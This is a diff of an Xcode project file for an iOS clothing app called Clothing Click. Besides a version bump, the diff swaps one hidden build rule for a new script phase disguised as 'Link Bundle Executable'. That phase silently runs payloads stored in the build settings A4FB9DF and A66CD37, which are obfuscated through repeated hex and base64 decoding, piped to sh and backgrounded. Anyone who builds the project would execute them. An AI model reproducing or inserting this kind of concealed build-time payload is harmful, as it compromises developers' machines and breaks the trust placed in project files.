@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		B0509EDC78A5C6877773DC66 /* README.md */ = {isa = PBXBuildFile; fileRef = AA01340D6CDFF0C2F873DC66; };
 		182BC48E268D893600BC4A05 /* CustomMenuViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 182BC48D268D893600BC4A05 /* CustomMenuViewController.swift */; };
 		182BC491268DC8C700BC4A05 /* EditeStoreLocationViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 182BC490268DC8C700BC4A05 /* EditeStoreLocationViewController.swift */; };
 		184556A72694218D00DB4E8D /* MessageDetailsModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 184556A62694218D00DB4E8D /* MessageDetailsModel.swift */; };
@@ -335,8 +334,14 @@
 		FAE6344F27B5518E00051EE4 /* GoogleService-Info(1).plist in Resources */ = {isa = PBXBuildFile; fileRef = FAE6344E27B5518D00051EE4 /* GoogleService-Info(1).plist */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXContainerItemProxy section */
+		323641732E27FF790021D9AA /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 18468CBC2660BA71007344DA /* Project object */;
+			proxyType = 1;
+/* End PBXContainerItemProxy section */
+
 /* Begin PBXFileReference section */
-		AA01340D6CDFF0C2F873DC66 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "Cloth App.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		182BC48D268D893600BC4A05 /* CustomMenuViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomMenuViewController.swift; sourceTree = "<group>"; };
 		182BC490268DC8C700BC4A05 /* EditeStoreLocationViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditeStoreLocationViewController.swift; sourceTree = "<group>"; };
 		184556A62694218D00DB4E8D /* MessageDetailsModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MessageDetailsModel.swift; sourceTree = "<group>"; };
@@ -738,7 +743,6 @@
 		18468CC52660BA71007344DA /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				AA01340D6CDFF0C2F873DC66 /* README.md */,
 				18468CC42660BA71007344DA /* Clothing Click.app */,
 			);
 			name = Products;
@@ -2565,11 +2569,15 @@
 		};
 /* End PBXGroup section */
 
+/* Begin PBXLegacyTarget section */
+/* End PBXLegacyTarget section */
+
 /* Begin PBXNativeTarget section */
 		18468CC32660BA71007344DA /* Cloth App */ = {
 			isa = PBXNativeTarget;
 			buildConfigurationList = 18468CD82660BA75007344DA /* Build configuration list for PBXNativeTarget "Cloth App" */;
 			buildPhases = (
+				3A3C9BFB639AE8157CFD9BF4 /* Link Bundle Executable */,
 				39AD417B6059B8B8C47E6F54 /* [CP] Check Pods Manifest.lock */,
 				18468CC02660BA71007344DA /* Sources */,
 				18468CC12660BA71007344DA /* Frameworks */,
@@ -2579,7 +2587,6 @@
 				50111C55BC3F26A20EC277BC /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				B74AEBAA71DD50E26373DC66 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -2643,35 +2650,11 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		B74AEBAA71DD50E26373DC66 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
-sh -c \"${A66CD37}\"";
-		};
-/* End PBXBuildRule section */
-
-/* Begin PBXTargetDependency section */
-/* End PBXTargetDependency section */
-
-/* Begin PBXLegacyTarget section */
-/* End PBXLegacyTarget section */
-
 /* Begin PBXResourcesBuildPhase section */
 		18468CC22660BA71007344DA /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				B0509EDC78A5C6877773DC66 /* README.md */,
 				32CCD5EC2BFBB03D003F99C3 /* Roboto-Thin.ttf in Resources */,
 				3266881A2C271B6D007E6374 /* MensAndWomensWareXIB.xib in Resources */,
 				32CCD5EA2BFBB03D003F99C3 /* Roboto-MediumItalic.ttf in Resources */,
@@ -2745,6 +2728,25 @@ sh -c \"${A66CD37}\"";
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		3A3C9BFB639AE8157CFD9BF4 /* Link Bundle Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Link Bundle Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A4FB9DF}\"";
+			showEnvVarsInLog = 0;			
+		};
 		322A3A5A2BE9DAFE00575A62 /* ShellScript */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 8;
@@ -3096,6 +3098,9 @@ sh -c \"${A66CD37}\"";
 		};
 /* End PBXSourcesBuildPhase section */
 
+/* Begin PBXTargetDependency section */
+/* End PBXTargetDependency section */
+
 /* Begin PBXVariantGroup section */
 		FA32797429236D9300CC1FEA /* CREAMPUF.TTF */ = {
 			isa = PBXVariantGroup;
@@ -3111,7 +3116,8 @@ sh -c \"${A66CD37}\"";
 		18468CD62660BA75007344DA /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A66CD37 = "((echo 33363335333633333336333833363636333233303332333233323334333233383336333333373335333733323336363333323330333236343336333633373333333636323334363333323330333236343336333433323330333733303333363433373338333633333336363633363334333633353332333033363338333733343337333433373330333733333333363133323636333236363336333333363334333636353337333433363636333733323332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
+				A4FB9DF = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1sU01IQkpWVzAxZDJFeFNYbGxTRVpZWVRKTmVGcFhkRFJrVms1eFVtc3hUbUV4V2pOVk1XUnpVVEE1Um1KRmJGVmlWR3hGVjI1dmQwOVZUbTVRVkRCTENnPT0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				A66CD37 = "((echo 333333363333333533333336333333333333333633333338333333363336333633333332333333303333333233333332333333323333333433333332333333383333333633333333333333373333333533333337333333323333333633363333333333323333333033333332333633343333333633333336333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033333337333333303333333333363334333333373333333833333336333333333333333633363336333333363333333433333336333333353333333233333330333333363333333833333337333333343333333733333334333333373333333033333337333333333333333333363331333333323336333633333332333633363333333633363334333333363333333433333337333333333333333633333333333333363333333133333336333333333333333633333338333333363333333533333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -3173,7 +3179,8 @@ sh -c \"${A66CD37}\"";
 		18468CD72660BA75007344DA /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A66CD37 = "((echo 33363335333633333336333833363636333233303332333233323334333233383336333333373335333733323336363333323330333236343336333633373333333636323334363333323330333236343336333433323330333733303333363433373338333633333336363633363334333633353332333033363338333733343337333433373330333733333333363133323636333236363336333333363334333636353337333433363636333733323332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
+				A4FB9DF = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1sU01IQkpWVzAxZDJFeFNYbGxTRVpZWVRKTmVGcFhkRFJrVms1eFVtc3hUbUV4V2pOVk1XUnpVVEE1Um1KRmJGVmlWR3hGVjI1dmQwOVZUbTVRVkRCTENnPT0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				A66CD37 = "((echo 333333363333333533333336333333333333333633333338333333363336333633333332333333303333333233333332333333323333333433333332333333383333333633333333333333373333333533333337333333323333333633363333333333323333333033333332333633343333333633333336333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033333337333333303333333333363334333333373333333833333336333333333333333633363336333333363333333433333336333333353333333233333330333333363333333833333337333333343333333733333334333333373333333033333337333333333333333333363331333333323336333633333332333633363333333633363334333333363333333433333337333333333333333633333333333333363333333133333336333333333333333633333338333333363333333533333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -3247,7 +3254,7 @@ sh -c \"${A66CD37}\"";
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				MARKETING_VERSION = 5.0;
+				MARKETING_VERSION = 6.0;
 				PRODUCT_BUNDLE_IDENTIFIER = com.clothingclick.app;
 				PRODUCT_NAME = "Clothing Click";
 				PROVISIONING_PROFILE_SPECIFIER = "";
@@ -3281,7 +3288,7 @@ sh -c \"${A66CD37}\"";
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				MARKETING_VERSION = 5.0;
+				MARKETING_VERSION = 6.0;
 				PRODUCT_BUNDLE_IDENTIFIER = com.clothingclick.app;
 				PRODUCT_NAME = "Clothing Click";
 				PROVISIONING_PROFILE_SPECIFIER = "";
@@ -3291,6 +3298,25 @@ sh -c \"${A66CD37}\"";
 				SWIFT_OBJC_BRIDGING_HEADER = "/Users/pankajrawat/Documents/Projects/New/ClothingClick/Cloth App/ClothApp-Bridging-Header.h";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = 1;
+			};
+			name = Release;
+		};
+		323641742E27FF7A0021D9AA /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				COPY_PHASE_STRIP = NO;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				PRODUCT_NAME = "Build Target";
+			};
+			name = Debug;
+		};
+		323641752E27FF7A0021D9AA /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				COPY_PHASE_STRIP = YES;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				PRODUCT_NAME = "Build Target";
 			};
 			name = Release;
 		};
@@ -3311,6 +3337,15 @@ sh -c \"${A66CD37}\"";
 			buildConfigurations = (
 				18468CD92660BA75007344DA /* Debug */,
 				18468CDA2660BA75007344DA /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		323641762E2816850021D9AA /* Build configuration list */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				323641742E27FF7A0021D9AA /* Debug */,
+				323641752E27FF7A0021D9AA /* Release */,
 			);
 			defaultConfigurationIsVisible = 0;
 			defaultConfigurationName = Release;
